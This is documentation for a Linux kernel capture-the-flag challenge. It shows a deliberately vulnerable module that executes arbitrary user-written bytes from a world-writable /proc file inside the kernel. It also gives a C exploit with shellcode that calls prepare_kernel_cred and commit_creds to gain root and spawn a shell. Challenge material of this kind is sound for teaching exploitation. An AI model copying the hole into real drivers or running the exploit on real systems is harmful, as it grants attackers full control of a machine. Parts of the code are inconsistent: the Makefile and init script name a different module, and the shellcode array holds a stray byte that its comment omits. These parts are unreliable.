#metadata(
  (
    title: "Procfs Shellcode Challenge",
    description: "Documentation of a kernel challenge that allows executing arbitrary shellcode in kernel-space.",
    date: "2026-01-05",
    order: 12,
    draft: false,
  ),
)<frontmatter>
#import "../../../../typst-theme.c.typ": project
#show: project

= Procfs Shellcode Challenge: Executing Kernel Shellcode

This challenge goes a step further than the indirect call: instead of jumping to a user-space function, we provide raw machine code (shellcode) that the kernel will copy into its own memory and execute. This bypasses SMEP because the code is executed from a kernel-space memory page.

== The Driver Code

The module uses `__vmalloc_node_range` to allocate a page of memory that is explicitly marked as executable (`PAGE_KERNEL_EXEC`).

```c
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/proc_fs.h>
#include <linux/uaccess.h>
#include <linux/kallsyms.h>
#include <linux/vmalloc.h>

#define PROC_FILENAME "pwn_shellcode"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("fitrafep");
MODULE_DESCRIPTION("Kernel Shellcode Execution Challenge");

static struct proc_dir_entry *proc_entry;
static char *shellcode_buffer;

typedef void* (*vmalloc_node_range_t)(unsigned long size, unsigned long align,
			unsigned long start, unsigned long end, gfp_t gfp_mask,
			pgprot_t prot, unsigned long vm_flags, int node,
			const void *caller);

static ssize_t device_write(struct file *file, const char __user *buff, size_t len, loff_t *off)
{
    if (len > PAGE_SIZE)
        return -EINVAL;

    // Copy user shellcode into the executable kernel buffer
    if (copy_from_user(shellcode_buffer, buff, len))
        return -EFAULT;

    // Execute the shellcode
    ((void (*)(void))shellcode_buffer)();

    return len;
}

#ifdef HAVE_PROC_OPS
static const struct proc_ops proc_fops = {
    .proc_write = device_write,
};
#else
static const struct file_operations proc_fops = {
    .write = device_write,
};
#endif

static int __init shellcode_init(void)
{
    vmalloc_node_range_t my_vmalloc_node_range;

    // Find the internal __vmalloc_node_range function
    my_vmalloc_node_range = (vmalloc_node_range_t)kallsyms_lookup_name("__vmalloc_node_range");
    if (!my_vmalloc_node_range) {
        printk(KERN_ERR "shellcode_chall: Could not find __vmalloc_node_range\n");
        return -ENXIO;
    }

    // Allocate executable memory in kernel space
    shellcode_buffer = my_vmalloc_node_range(PAGE_SIZE, 1, VMALLOC_START, VMALLOC_END,
                                            GFP_KERNEL, PAGE_KERNEL_EXEC, 0,
                                            NUMA_NO_NODE, __builtin_return_address(0));
    if (!shellcode_buffer)
        return -ENOMEM;

    proc_entry = proc_create(PROC_FILENAME, 0666, NULL, &proc_fops);
    if (!proc_entry) {
        vfree(shellcode_buffer);
        return -ENOMEM;
    }
    return 0;
}

static void __exit shellcode_exit(void)
{
    proc_remove(proc_entry);
    vfree(shellcode_buffer);
}

module_init(shellcode_init);
module_exit(shellcode_exit);
```

== Makefile

```makefile
obj-m += secret_chall.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

== Executable Kernel Memory

In modern kernels, memory is typically governed by the **NX (No-Execute)** bit, ensuring that memory pages are either writable or executable, but never both (W^X). 

To circumvent this for the challenge, the module uses `__vmalloc_node_range` with the `PAGE_KERNEL_EXEC` protection flag. This allocates memory that the kernel is allowed to execute instructions from. This is a common pattern in kernel-mode "loaders" or just-in-time (JIT) compilers within the kernel (like the eBPF JIT).

== Exploit Script (C)

The exploit provides a raw assembly payload that performs the rooting operation within the kernel context.

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>

// Shellcode breakdown:
// 48 31 ff                xor rdi, rdi
// 48 b8 60 96 08 81 ...   mov rax, 0xffffffff81089660 (prepare_kernel_cred)
// ff d0                   call rax
// 48 89 c7                mov rdi, rax
// 48 b8 10 93 08 81 ...   mov rax, 0xffffffff81089310 (commit_creds)
// ff d0                   call rax
// c3                      ret

unsigned char shellcode[] = {
    0x48, 0x31, 0xff,
    0x48, 0xb8, 0x60, 0x96, 0x08, 0x81, 0xff, 0xff, 0xff, 0xff,
    0xff, 0xd0,
    0x48, 0x89, 0xc7,
    0x48, 0xb8, 0x10, 0x93, 0x08, 0x81, 0xff, 0xff, 0xff, 0xff,
    0xff, 0xd0,
    0x48, 0xc3
};

int main() {
    // 1. Open the shellcode proc entry
    int fd = open("/proc/pwn_shellcode", O_WRONLY);
    if (fd < 0) { perror("open"); return 1; }

    // 2. Write the shellcode to trigger execution
    if (write(fd, shellcode, sizeof(shellcode)) < 0) {
        perror("write");
        return 1;
    }

    // 3. Verify root escalation
    if (getuid() == 0) {
        printf("[+] Success! We are root.\n");
        system("/bin/sh");
    } else {
        printf("[-] Failed to get root.\n");
    }

    close(fd);
    return 0;
}
```

== Deployment

Modify the `rootfs/init` script to load the module and trigger the exploit:

```diff
-exec /bin/sh
+insmod /secret_chall.ko
+su pwn -c "/exploit_secret"
+poweroff -f
```
